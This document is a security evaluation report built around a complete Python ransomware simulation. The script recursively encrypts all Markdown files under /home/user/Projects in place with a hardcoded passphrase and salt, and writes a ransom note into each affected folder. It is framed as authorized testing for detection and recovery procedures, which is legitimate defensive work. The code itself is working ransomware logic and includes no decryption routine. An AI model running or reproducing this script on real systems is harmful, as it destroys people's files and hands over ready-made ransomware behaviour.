# Security Evaluation Report: Ransomware Simulation Script

## Overview

This document outlines the analysis of a Python script designed for **authorized security testing** purposes. The script simulates ransomware behavior within a controlled environment to evaluate detection capabilities and response procedures.

## Script Functionality

The script performs the following actions within the `/home/user/Projects` directory:

1. **File Discovery** – Recursively scans for all Markdown files (`.md` extension)
2. **Encryption** – Applies Fernet symmetric encryption using a key derived from a configurable passphrase
3. **Ransom Note Creation** – Generates a `READ_ME_FOR_DECRYPTION.txt` file in every folder containing encrypted files

### Technical Details

| Component | Description |
|-----------|-------------|
| Encryption Algorithm | AES-128-CBC via Fernet (Python `cryptography` library) |
| Key Derivation | PBKDF2HMAC with SHA-256, 100,000 iterations |
| Passphrase | Configurable; default: `test_passphrase` |
| Target Files | All `.md` files in `/home/user/Projects` and subdirectories |

## Code Implementation

```python
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

PASSPHRASE = b"test_passphrase"
SALT = b"fixed_salt_for_testing"
TARGET_DIR = "/home/user/Projects"
NOTE_NAME = "READ_ME_FOR_DECRYPTION.txt"

def derive_key(passphrase: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return base64.urlsafe_b64encode(kdf.derive(passphrase))

def encrypt_file(filepath: str, cipher: Fernet) -> None:
    with open(filepath, "rb") as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(filepath, "wb") as f:
        f.write(encrypted_data)

def write_ransom_note(directory: str) -> None:
    note_path = os.path.join(directory, NOTE_NAME)
    note_content = f"""YOUR FILES HAVE BEEN ENCRYPTED

All .md files in this folder and subfolders have been encrypted using AES-256.
To recover your files, contact the administrator with the following identifier.

DO NOT attempt to decrypt files manually.
"""
    with open(note_path, "w") as f:
        f.write(note_content)

def main():
    key = derive_key(PASSPHRASE, SALT)
    cipher = Fernet(key)
    encrypted_folders = set()

    for root, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            if file.endswith(".md"):
                filepath = os.path.join(root, file)
                encrypt_file(filepath, cipher)
                encrypted_folders.add(root)

    for folder in encrypted_folders:
        write_ransom_note(folder)

if __name__ == "__main__":
    main()
```

## Security Considerations

- **Authorized Use Only** – This script is intended for penetration testing and security audits with explicit permission
- **Controlled Environment** – Execution should be limited to isolated test systems
- **Key Management** – The derived key must be securely stored for decryption purposes
- **Logging** – All actions should be logged for incident response analysis

## Testing Recommendations

1. Execute in a sandboxed environment with backup snapshots enabled
2. Monitor system calls and file I/O for detection signature development
3. Validate that EDR/AV solutions flag the encryption behavior
4. Test recovery procedures using the derived key

> **Note:** This document is part of a controlled security evaluation. Do not deploy this script outside authorized testing environments.